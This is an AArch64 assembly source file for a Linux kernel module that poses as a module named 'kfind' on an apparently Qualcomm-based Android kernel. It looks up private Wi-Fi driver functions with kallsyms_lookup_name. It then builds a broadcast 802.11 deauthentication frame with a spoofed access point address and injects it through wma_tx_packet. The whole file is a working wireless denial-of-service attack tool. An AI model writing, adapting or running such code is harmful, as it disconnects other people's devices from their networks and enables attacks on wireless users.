/*
 * wmatx2.S - Test cds_get_context(54) using known-good kfind structure
 * Build: as -o wmatx2.o wmatx2.S && ld -r -o wmatx2.ko wmatx2.o
 */

.section .gnu.linkonce.this_module, "aw"
.balign 256
__this_module:
    .fill 24, 1, 0
    .asciz "kfind"
    .fill 50, 1, 0
    .fill 256, 1, 0
    .quad init_module
    .fill 440, 1, 0
    .quad cleanup_module
    .fill 40, 1, 0

.section .modinfo, "a"
    .asciz "vermagic=4.19.81-perf+ SMP preempt mod_unload modversions aarch64"
    .asciz "name=kfind"
    .asciz "license=GPL"

.section __versions, "a"
    .quad 0
    .asciz "module_layout"
    .balign 64, 0
    .quad 0
    .asciz "printk"
    .balign 64, 0
    .quad 0
    .asciz "kallsyms_lookup_name"
    .balign 64, 0

.section .rodata, "a"
str_cds:
    .asciz "cds_get_context"
str_pktalloc:
    .asciz "cds_packet_alloc"
str_wmatx:
    .asciz "wma_tx_packet"
fmt_init:
    .asciz "wmatx2: init\n"
fmt_sym:
    .asciz "wmatx2: cds=%px pktalloc=%px wmatx=%px\n"
fmt_ctx:
    .asciz "wmatx2: cds_get_context(54)=%px\n"
fmt_alloc:
    .asciz "wmatx2: cds_packet_alloc(26) status=%d pkt=%px data=%px\n"
fmt_pre:
    .asciz "wmatx2: about to call wma_tx_packet\n"
fmt_res:
    .asciz "wmatx2: wma_tx_packet returned %d\n"
fmt_err:
    .asciz "wmatx2: ERROR: %s\n"
str_sym_err:
    .asciz "symbol not found"
str_ctx_err:
    .asciz "wma context is NULL"
str_alloc_err:
    .asciz "packet alloc failed"
fmt_done:
    .asciz "wmatx2: done\n"

/* Deauth frame: 26 bytes */
.balign 4
deauth_frame:
    .short 0x00C0       /* FC: deauth, from DS */
    .short 0x0000       /* Duration */
    .byte 0xff,0xff,0xff,0xff,0xff,0xff  /* DA: broadcast */
    .byte 0x04,0x67,0x61,0xd6,0xdc,0x92 /* SA: spoofed AP */
    .byte 0x04,0x67,0x61,0xd6,0xdc,0x92 /* BSSID */
    .short 0x0000       /* Seq ctrl */
    .short 0x0007       /* Reason: Class 3 */
deauth_end:
.equ FLEN, deauth_end - deauth_frame

.section .init.text, "ax"
.globl init_module
.type init_module, %function
init_module:
    stp x29, x30, [sp, #-112]!
    mov x29, sp
    stp x19, x20, [sp, #16]
    stp x21, x22, [sp, #32]
    stp x23, x24, [sp, #48]
    stp x25, x26, [sp, #64]
    /* sp+80..sp+96: stack vars for pkt alloc */

    adrp x0, fmt_init
    add x0, x0, :lo12:fmt_init
    bl printk

    /* Resolve symbols */
    adrp x0, str_cds
    add x0, x0, :lo12:str_cds
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x19, x0                /* x19 = cds_get_context */

    adrp x0, str_pktalloc
    add x0, x0, :lo12:str_pktalloc
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x20, x0                /* x20 = cds_packet_alloc */

    adrp x0, str_wmatx
    add x0, x0, :lo12:str_wmatx
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x21, x0                /* x21 = wma_tx_packet */

    /* Print symbols */
    adrp x0, fmt_sym
    add x0, x0, :lo12:fmt_sym
    mov x1, x19
    mov x2, x20
    mov x3, x21
    bl printk

    /* Get WMA context */
    mov w0, #54
    blr x19
    mov x22, x0

    adrp x0, fmt_ctx
    add x0, x0, :lo12:fmt_ctx
    mov x1, x22
    bl printk

    cbz x22, .Lctxerr

    /* Allocate packet on STACK */
    stp xzr, xzr, [sp, #80]    /* clear data_ptr, pkt_ptr */

    mov w0, #FLEN               /* size = 26 */
    add x1, sp, #80             /* &data_ptr */
    add x2, sp, #88             /* &pkt_ptr */
    blr x20                     /* cds_packet_alloc */
    mov w23, w0

    ldr x24, [sp, #88]          /* pkt_ptr */
    ldr x25, [sp, #80]          /* data_ptr */

    /* Print alloc result */
    adrp x0, fmt_alloc
    add x0, x0, :lo12:fmt_alloc
    mov w1, w23
    mov x2, x24
    mov x3, x25
    bl printk

    cbnz w23, .Lallocerr

    /* Copy deauth frame */
    adrp x8, deauth_frame
    add x8, x8, :lo12:deauth_frame
    mov x9, x25
    mov w10, #FLEN
.Lcopy:
    cbz w10, .Lcopy_done
    ldrb w11, [x8], #1
    strb w11, [x9], #1
    sub w10, w10, #1
    b .Lcopy
.Lcopy_done:

    adrp x0, fmt_pre
    add x0, x0, :lo12:fmt_pre
    bl printk

    /*
     * wma_tx_packet(wma_ctx, pkt, len, type, dir, tid,
     *               dl_cb, pData, ota_cb, tx_flag,
     *               vdev_id, tdls, chan_freq, rid)
     *
     * x0=wma_ctx x1=pkt x2=26 x3=0 x4=0 x5=0 x6=0 x7=0
     * stack: 0,0,0,0,0,0
     */
    sub sp, sp, #48
    stp xzr, xzr, [sp]          /* ota_cb=0, tx_flag=0 */
    stp xzr, xzr, [sp, #16]     /* vdev_id=0, tdls=0 */
    stp xzr, xzr, [sp, #32]     /* chan_freq=0, rid=0 */

    mov x0, x22                  /* wma_ctx */
    mov x1, x24                  /* pkt */
    mov w2, #FLEN                /* len=26 */
    mov w3, #1                   /* type=TXRX_FRM_802_11_MGMT */
    mov w4, #0                   /* dir=IBSS? */
    mov w5, #0                   /* tid=0 */
    mov x6, xzr                  /* dl_cb=NULL */
    mov x7, xzr                  /* pData=NULL */

    blr x21                      /* wma_tx_packet */
    add sp, sp, #48

    mov w26, w0

    adrp x0, fmt_res
    add x0, x0, :lo12:fmt_res
    mov w1, w26
    bl printk

    b .Lok

.Lsymerr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_sym_err
    add x1, x1, :lo12:str_sym_err
    bl printk
    mov w0, #-1
    b .Lret

.Lctxerr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_ctx_err
    add x1, x1, :lo12:str_ctx_err
    bl printk
    mov w0, #-1
    b .Lret

.Lallocerr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_alloc_err
    add x1, x1, :lo12:str_alloc_err
    bl printk
    mov w0, #-1
    b .Lret

.Lok:
    adrp x0, fmt_done
    add x0, x0, :lo12:fmt_done
    bl printk
    mov w0, #0

.Lret:
    ldp x25, x26, [sp, #64]
    ldp x23, x24, [sp, #48]
    ldp x21, x22, [sp, #32]
    ldp x19, x20, [sp, #16]
    ldp x29, x30, [sp], #112
    ret

.section .exit.text, "ax"
.globl cleanup_module
.type cleanup_module, %function
cleanup_module:
    ret

.section .note.Linux, "a", @note
    .long 6
    .long 0
    .long 0x100
    .asciz "Linux"
    .balign 4

.section .plt, "ax"
    .balign 8
    .space 8
.section .init.plt, "ax"
    .balign 8
    .space 8
.section .text.ftrace_trampoline, "ax"
    .balign 8
